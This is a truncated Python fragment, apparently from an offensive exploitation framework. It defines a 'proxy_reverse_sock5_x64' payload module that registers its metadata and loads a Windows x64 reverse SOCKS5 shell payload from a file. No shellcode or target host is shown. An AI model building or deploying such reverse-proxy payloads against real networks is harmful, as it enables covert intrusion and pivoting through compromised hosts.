...
class Payload(BGExploit):
    ...
    def __init__(self):
        ...
        self.register_info({
            "Info":{
                "Name":"proxy_reverse_sock5_x64",
                "Author":"Mosin",
                "Type":"Reverse",
                "Ref":"----",
                "Version":"1.0",
                "Desc":"This module plug-in for the proxy forwarded to a network host to the remote host,\
                        it is mainly used for network through use, this module should be used with server-side program together."
            }
        })
    ...
    def open_file(self):
        try:
            f = open('lib/soure/data/win_proxy_reverse_x64_sock5.shell','r')
            file_data = f.read()
        except:
